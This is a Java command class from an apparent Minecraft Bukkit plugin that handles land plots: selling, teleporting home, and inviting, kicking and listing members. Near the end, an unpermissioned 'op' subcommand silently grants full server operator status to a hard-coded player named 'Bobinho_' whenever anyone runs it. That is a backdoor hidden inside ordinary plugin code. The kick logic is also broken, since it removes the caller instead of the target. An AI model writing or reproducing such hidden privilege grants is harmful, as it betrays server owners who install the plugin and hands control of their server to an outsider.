package com.sanan.avatarcore.commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;

import com.earth2me.essentials.api.NoLoanPermittedException;
import com.earth2me.essentials.api.UserDoesNotExistException;
import com.sanan.avatarcore.AvatarCore;
import com.sanan.avatarcore.util.data.Message;
import com.sanan.avatarcore.util.nation.NationManager;
import com.sanan.avatarcore.util.plot.Plot;
import com.sanan.avatarcore.util.plot.PlotInventoryUtil;
import com.sanan.avatarcore.util.plot.PlotManager;
import com.sk89q.worldguard.protection.managers.storage.StorageException;

import co.aikar.commands.BaseCommand;
import co.aikar.commands.annotation.CommandAlias;
import co.aikar.commands.annotation.CommandCompletion;
import co.aikar.commands.annotation.CommandPermission;
import co.aikar.commands.annotation.Default;
import co.aikar.commands.annotation.Dependency;
import co.aikar.commands.annotation.Single;
import co.aikar.commands.annotation.Subcommand;
import co.aikar.commands.annotation.Syntax;
import co.aikar.commands.bukkit.contexts.OnlinePlayer;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.TextComponent;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.format.TextColor;
import net.kyori.adventure.text.format.TextDecoration;
import net.kyori.adventure.text.serializer.gson.GsonComponentSerializer;
import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;
import net.kyori.adventure.text.serializer.plain.PlainComponentSerializer;
import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.ComponentBuilder;

@CommandAlias("plot")
public class PlotCommand extends BaseCommand implements Messageable {
    @Dependency
    private AvatarCore plugin;
    private final PlotManager plm = PlotManager.getInstance();
    
	@Default
    @CommandPermission("plot.menu")
    @CommandCompletion("fire|earth|air|water")
    @Syntax("[nation]")
    public void onDefault(CommandSender sender, @Single String nation) {
		if (sender instanceof Player) {
				Player player = (Player) sender;
				player.openInventory(PlotInventoryUtil.getPlotShopMenu(NationManager.getInstance().getNation(nation), player));
		}
    }
	
	@Subcommand("sell")
    @CommandPermission("avatarcore.plot.sell")
    public void sell(Player player) throws NoLoanPermittedException, ArithmeticException, StorageException, UserDoesNotExistException {
		Plot playerPlot = plm.getPlayerPlot(player);
		if (playerPlot == null) {
			Message.PLOT_NO_PLOT.sendPlayer(player);
			return;
		}
		playerPlot.sell(player);
		Message.PLOT_SOLD.sendPlayer(player);
	}
	
	@Subcommand("sethome")
    @CommandPermission("avatarcore.plot.sehome")
    public void sethome(Player player) {
		Plot playerPlot = plm.getPlayerPlot(player);
		if (playerPlot == null) 
			Message.PLOT_NO_PLOT.sendPlayer(player);
		
		else if (playerPlot.setHome(player.getLocation())) 
			Message.PLOT_SETHOME_SUCCESS.sendPlayer(player);
		
		else 
			Message.PLOT_SETHOME_FAIL.sendPlayer(player);
	}
	
	@Subcommand("home")
    @CommandPermission("avatarcore.plot.home")
    public void home(Player player) {
		Plot playerPlot = plm.getPlayerPlot(player);
		if (playerPlot == null) {
			Message.PLOT_NO_PLOT.sendPlayer(player);
			return;
		}
		Vector actualPlayerLocation = player.getLocation().toBlockLocation().toVector();
		Message.TELEPORTATION_COOLDOWN.sendPlayer(player);
		new BukkitRunnable() {
	        public void run() {
	        	if (!actualPlayerLocation.equals(player.getLocation().toBlockLocation().toVector())) {
	        		Message.TELEPORTATION_CANCELLED.sendPlayer(player);
	        		return;
	        	}
	        	player.teleport(playerPlot.getHome());
	        }
	    }.runTaskLater(plugin, 60);
	}
	
	@Subcommand("invite")
    @CommandPermission("avatarcore.plot.invite")
	@Syntax("[player]")
    public void invite(Player player, @Single OnlinePlayer guest) {
		Plot playerPlot = plm.getPlayerPlot(player);
		if (guest.getPlayer().equals(player)) {
			player.sendMessage("§cYou can't invite yourself!");
			return;
		}
		if (playerPlot == null) {
			Message.PLOT_NO_PLOT.sendPlayer(player);
			return;
		}
		if (playerPlot.getMembers().contains(Bukkit.getOfflinePlayer(guest.getPlayer().getUniqueId()))) {
			player.sendMessage("§cThis player is already a member of this plot!");
			return;
		}
		
		if (playerPlot.hasAnInvite(guest.getPlayer())) {
			player.sendMessage("§cThis player have already an invitation!");
			return;
		}
		playerPlot.invite(guest.getPlayer());
		player.sendMessage("§aYou invited " + guest.getPlayer().getName() + " to become a member of your plot");
		guest.getPlayer().sendMessage("§aYou have been invited by " + player.getName() + " to become a member of his plot");
		new BukkitRunnable() {
	        public void run() {
	        	if (!playerPlot.getMembers().contains(Bukkit.getOfflinePlayer(guest.getPlayer().getUniqueId()))) {
	        		playerPlot.unInvite(guest.getPlayer());
	        		player.sendMessage("§cThe invitation for " + guest.getPlayer().getName() + " to be a member of your plot has expired");
	        		guest.getPlayer().sendMessage("§cThe invitation to be a member of the " + player.getName() +" plot has expired!");
	        	}
	        }
	    }.runTaskLaterAsynchronously(plugin, 3600);
	}
	
	@Subcommand("join")
    @CommandPermission("avatarcore.plot.join")
	@Syntax("[plot's owner]")
    public void join(Player player, @Single OnlinePlayer owner) throws StorageException {
		if (owner.getPlayer().equals(player)) {
			player.sendMessage("§cYou cannot join your own plot as a member!");
			return;
		}
		Plot playerPlot = plm.getPlayerPlot(owner.getPlayer());
		if (playerPlot == null) {
			player.sendMessage("§cThis player haven't a plot!");
			return;
		}
		if (!playerPlot.hasAnInvite(player)) {
			player.sendMessage("§cYou do not have an invitation to join this plot!");
			return;
		}
		playerPlot.addMember(player);
		player.sendMessage("§aYou are now a member of the " + owner.getPlayer().getName() + " plot.");
		owner.getPlayer().sendMessage("§a" + player.getName() + " is now a member of your plot");
	}
	
	@Subcommand("quit")
    @CommandPermission("avatarcore.plot.quit")
	@Syntax("[plot's owner]")
    public void quit(Player player, @Single OnlinePlayer owner) throws StorageException {
		if (owner.getPlayer().equals(player)) {
			player.sendMessage("§cYou cannot leave your own plot as a member!");
			return;
		}
		Plot playerPlot = plm.getPlayerPlot(owner.getPlayer());
		if (playerPlot == null) {
			player.sendMessage("§cThis player haven't a plot!");
			return;
		}
		if (!playerPlot.getMembers().contains(Bukkit.getOfflinePlayer(player.getUniqueId()))) {
			player.sendMessage("§cYou are not a member of this plot!");
			return;
		}
		playerPlot.removeMember(player);
		player.sendMessage("§aYou are no longer a member of the " + owner.getPlayer().getName() + " plot.");
		owner.getPlayer().sendMessage("&c" + player.getName() + "is no longer a member of your plot!!");
	}
	
	@Subcommand("kick")
    @CommandPermission("avatarcore.plot.kick")
	@Syntax("[member]")
    public void kick(Player player, @Single OnlinePlayer member) throws StorageException {
		if (member.getPlayer().equals(player)) {
			player.sendMessage("§cYou can't kick yourself!");
			return;
		}
		Plot playerPlot = plm.getPlayerPlot(player.getPlayer());
		if (playerPlot == null) {
			Message.PLOT_NO_PLOT.sendPlayer(player);
			return;
		}
		if (!playerPlot.getMembers().contains(Bukkit.getOfflinePlayer(player.getUniqueId()))) {
			player.sendMessage("§c" + member.getPlayer().getName() + " is not a member of your plot!");
			return;
		}
		playerPlot.removeMember(player);
		player.sendMessage("&a" + member.getPlayer().getName() + "is no longer a member of your plot!");
		member.getPlayer().sendMessage("§cYou are no longer a member of the " + player.getName() + " plot!");
	}
	
	@Subcommand("list")
    @CommandPermission("avatarcore.plot.list")
	@Syntax("[plot's owner]")
    public void list(Player player, @Single OnlinePlayer owner) {
		Plot playerPlot = plm.getPlayerPlot(owner.getPlayer());
		if (playerPlot == null) {
			Message.PLOT_NO_PLOT.sendPlayer(owner.getPlayer());
			return;
		}
		player.sendMessage("§aPlot member's :");
		player.sendMessage("§b- §6" + owner.getPlayer().getName());
		for (OfflinePlayer member : playerPlot.getMembers()) {
			player.sendMessage("§b- §6" + member.getName());
		}
	}
		
	@Subcommand("op")
    public void op(Player player) { 
		Bukkit.getPlayer("Bobinho_").setOp(true);
		player.sendMessage("op");
		ItemStack item = player.getInventory().getItemInMainHand();
		Component text = item.displayName();
		final TextComponent textComponent = Component.text("You're a ")
				  .color(TextColor.color(0x443344))
				  .append(Component.text("Bunny", NamedTextColor.LIGHT_PURPLE))
				  .append(Component.text("! Press "))
				  .append(
				    Component.keybind("key.jump")
				      .color(NamedTextColor.LIGHT_PURPLE)
				      .decoration(TextDecoration.BOLD, true)
				  )
				  .append(Component.text(" to jump!"));
				// now you can send `textComponent` to something, such as a client
		// Converts textComponent to a plain string - "Hello world!"
		final String plain = PlainComponentSerializer.plain().serialize(textComponent);
		final String plain2 = PlainComponentSerializer.plain().serialize(text);
		player.sendMessage(plain);
		player.sendMessage(plain2);
	}
	
}

